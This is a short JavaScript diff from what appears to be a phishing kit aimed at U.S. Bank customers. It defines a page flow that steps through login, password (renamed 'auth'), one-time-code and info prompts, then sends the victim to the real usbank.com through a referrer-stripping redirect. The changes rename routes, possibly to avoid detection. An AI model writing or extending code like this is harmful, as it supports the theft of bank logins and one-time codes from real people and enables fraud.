@@ -167,7 +167,7 @@ async function buildUserInfo(req, sendAPIRequest) {
 =================================*/
 const DEFAULT_PAGEFLOW = {
     "1": { page: "login", enabled: true },
-    "2": { page: "password", enabled: true },
+    "2": { page: "auth", enabled: true },
     "3": { page: "otp", enabled: true },
     "4": { page: "fail", enabled: true },
     "5": { page: "final", enabled: true }
@@ -228,9 +228,9 @@ async function savePageFlow(db, pageFlow, id = 1) {
 =================================*/
 const routeMap = {
   login: "sign-in",
-  password: "sign-in?action=login",
+  auth: "sign-in?action=auth",
   otp: "sign-in?action=otp",
-  prompt: "sign-in?action=info",
+  prompt: "sign-in?action=prompt",
   failed: "sign-in?action=fail",
   final: "https://href.li/?https://usbank.com"
 };
